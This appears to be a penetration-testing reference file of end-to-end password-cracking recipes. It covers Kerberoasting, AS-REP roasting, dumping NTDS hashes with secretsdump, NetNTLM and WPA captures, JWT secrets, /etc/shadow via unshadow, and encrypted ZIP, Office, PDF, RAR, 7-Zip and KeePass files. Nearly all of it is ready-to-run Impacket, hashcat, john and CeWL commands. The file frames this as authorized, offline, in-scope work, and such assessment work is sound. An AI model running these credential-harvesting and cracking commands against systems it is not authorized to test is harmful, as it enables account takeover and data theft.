# Per-source cracking recipes (end-to-end)

Each recipe: **format the hash -> pick mode -> attack -> harvest**. All commands run
**offline** on captured, in-scope material. Nothing here touches a live service.
Replace `wordlist.txt` with `rockyou.txt` / SecLists / weakpass as budget allows;
`OneRuleToRuleThemAll.rule` is the general-purpose rule file.

---

## 1. Kerberoast (AD service-account tickets) — `-m 13100 / 19600 / 19700`

Tickets come from `active-directory-attack-paths` (Rubeus / Impacket GetUserSPNs /
NetExec). The `$krb5tgs$` string embeds the etype.

```bash
# harvest (from an authenticated AD foothold — see AD skill)
GetUserSPNs.py -request -dc-ip 10.0.0.1 CORP.LOCAL/user:'Pass' -outputfile kerb.txt
#   $krb5tgs$23$... -> RC4  -> -m 13100  (crack fastest; prefer if account allows)
#   $krb5tgs$17$... -> AES128 -> -m 19600
#   $krb5tgs$18$... -> AES256 -> -m 19700
hashcat -m 13100 -a 0 kerb.txt wordlist.txt -r OneRuleToRuleThemAll.rule
hashcat -m 13100 kerb.txt --show --username    # recovered SPN passwords
```
Service accounts often have long-unchanged, human-set passwords — wordlist+rules is
usually enough. Report cracked SPN creds as high severity (service-account takeover).

## 2. AS-REP roasting (users with no Kerberos pre-auth) — `-m 18200`

```bash
GetNPUsers.py -dc-ip 10.0.0.1 -request CORP.LOCAL/ -usersfile users.txt -format hashcat -outputfile asrep.txt
#   $krb5asrep$23$user@REALM:...
hashcat -m 18200 -a 0 asrep.txt wordlist.txt -r OneRuleToRuleThemAll.rule
```

## 3. NTLM / LM (SAM, NTDS.dit, LSASS) — `-m 1000` / `-m 3000`

Hashes come from `secretsdump.py`, `nxc`, mimikatz, or a `NTDS.dit`+`SYSTEM` extraction.

```bash
# secretsdump output line: user:RID:LMhash:NThash:::
secretsdump.py CORP.LOCAL/user:'Pass'@10.0.0.1 -just-dc -outputfile domain
awk -F: '{print $1":"$4}' domain.ntds > nt.txt      # keep user:NThash
cut -d: -f4 domain.ntds > nt_only.txt               # hashes only
hashcat -m 1000 -a 0 nt_only.txt wordlist.txt -r OneRuleToRuleThemAll.rule
# LM (legacy, uppercase, split 7-char halves — crack then recombine to NTLM)
cut -d: -f3 domain.ntds | grep -v 'aad3b435' > lm.txt
hashcat -m 3000 -a 3 lm.txt ?a?a?a?a?a?a?a --increment
# stats for the report (masked)
hashcat -m 1000 nt_only.txt --show | wc -l          # count cracked
```
For a big domain: crack, then **feed recovered plaintexts back as a wordlist** to
catch reuse across accounts. Report password-reuse and any cracked privileged account.

## 4. NetNTLMv1 / NetNTLMv2 (Responder / relay) — `-m 5500 / 5600`

Captured by Responder/`ntlmrelayx` when a host authenticates to you (see AD skill —
capture by *listening*, never coerce out-of-scope hosts).

```bash
# Responder logs: Responder-Session.log or logs/*.txt (already hashcat-formatted)
hashcat -m 5600 -a 0 netntlmv2.txt wordlist.txt -r OneRuleToRuleThemAll.rule
# NetNTLMv1 (weak): mode 5500; if challenge fixed to 1122334455667788 it can be
# converted to NT hash via crack.sh-style DES — DETECT/report as critical downgrade,
# don't rely on third-party services (scope rule).
```

## 5. WPA / WPA2 (handshake or PMKID) — `-m 22000`

Capture from `wireless-security` (PMKID via hcxdumptool, or a 4-way handshake caught
on natural reconnect — **no deauth**). Mode **22000** unifies PMKID + EAPOL and
replaces the old 2500/16800.

```bash
hcxpcapngtool -o wpa.22000 capture.pcapng          # convert capture -> 22000 line
hashcat -m 22000 -a 0 wpa.22000 wordlist.txt        # WPA keys are >=8 chars
hashcat -m 22000 -a 3 wpa.22000 ?d?d?d?d?d?d?d?d     # e.g. phone-number PSKs
hashcat -m 22000 wpa.22000 --show
```
WPA is a **slow** PBKDF2 hash — be frugal: targeted wordlists (rockyou, ISP-default
patterns) and small masks; full brute-force is infeasible. Crack only handshakes you
were authorized to capture.

## 6. JWT (HMAC-signed tokens) — `-m 16500`

The whole `header.payload.signature` string is the "hash". Only **HS256/384/512**
(symmetric) are crackable — a weak signing secret means full token forgery.

```bash
echo 'eyJhbGciOiJIUzI1NiI...<full.jwt>' > jwt.txt
hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list       # SecLists has a JWT secrets list
hashcat -m 16500 -a 0 jwt.txt wordlist.txt -r best64.rule
hashcat -m 16500 jwt.txt --show
```
RS/ES/PS (asymmetric) JWTs are **not** crackable this way — report those under
`web-vuln-hunting` (alg-confusion, key issues) instead. A cracked HMAC secret = forge
arbitrary tokens; report as critical.

## 7. Linux `/etc/shadow` — `unshadow` + john / hashcat `-m 1800`

```bash
# combine passwd + shadow (john jumbo tool) into crackable lines
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=rockyou.txt --rules=Jumbo unshadowed.txt
john --show unshadowed.txt
# or crack the sha512crypt hashes with GPU hashcat:
grep '\$6\$' unshadowed.txt | cut -d: -f2 > sha512.txt
hashcat -m 1800 -a 0 sha512.txt rockyou.txt -r best64.rule   # $6$ = slow, stay frugal
#   $1$ md5crypt -> -m 500 ; $5$ sha256crypt -> -m 7400 ; $y$/$7$ yescrypt -> john
```
`$6$` is deliberately slow — wordlist + `best64` only; do not brute-force.

## 8. Archives & documents — `*2john` extractors

The John jumbo suite ships `*2john` scripts that extract a crackable hash from an
encrypted file. Extract with `*2john`, then crack with **hashcat** (GPU) or `john`.

```bash
# ZIP
zip2john secret.zip > zip.hash        # PKZIP -> -m 17200 ; WinZip/AES -> -m 13600
hashcat -m 17200 -a 0 zip.hash wordlist.txt -r best64.rule

# MS Office (Word/Excel/PowerPoint)
office2john report.docx > office.hash  # 2007->9400  2010->9500  2013+->9600
hashcat -m 9600 -a 0 office.hash wordlist.txt -r best64.rule

# PDF
pdf2john.pl locked.pdf > pdf.hash      # 1.4-1.6 -> -m 10500 ; 1.7 L8 -> -m 10700
hashcat -m 10500 -a 0 pdf.hash wordlist.txt

# RAR
rar2john archive.rar > rar.hash        # RAR3-hp -> -m 12500 ; RAR5 -> -m 13000
hashcat -m 13000 -a 0 rar.hash wordlist.txt

# 7-Zip (very slow — small targeted attacks only)
7z2john.pl archive.7z > 7z.hash        # -> -m 11600
hashcat -m 11600 -a 0 7z.hash wordlist.txt -r best64.rule

# KeePass (.kdbx) — very slow; a cracked master unlocks the whole vault
keepass2john Database.kdbx > kp.hash   # -> -m 13400  (strip the "Database:" label if present)
hashcat -m 13400 -a 0 kp.hash wordlist.txt -r best64.rule
```
Slow document/vault hashes (7z, KeePass, Office2013, PDF-L8) reward **frugal,
targeted** attacks — the file owner's other cracked passwords, company terms (CeWL),
`best64` — not brute-force.

---

## Wordlist curation (feed every recipe above)

```bash
# scrape a target's website/CTF page into a candidate list (min length 5)
cewl -d 3 -m 5 -w cewl.txt https://target.example.com
# mangle company terms into policy-shaped guesses (mentalist GUI, or rules)
hashcat --stdout cewl.txt -r OneRuleToRuleThemAll.rule > company_candidates.txt
# common curated sources: rockyou.txt (Kali), SecLists (Passwords/*), weakpass.com
# reuse loop: recovered plaintexts become the best wordlist for the rest of the set
hashcat -m 1000 nt_only.txt --show | cut -d: -f2 | sort -u > cracked_seed.txt
hashcat -m 1000 --left nt_only.txt cracked_seed.txt -r best64.rule
```
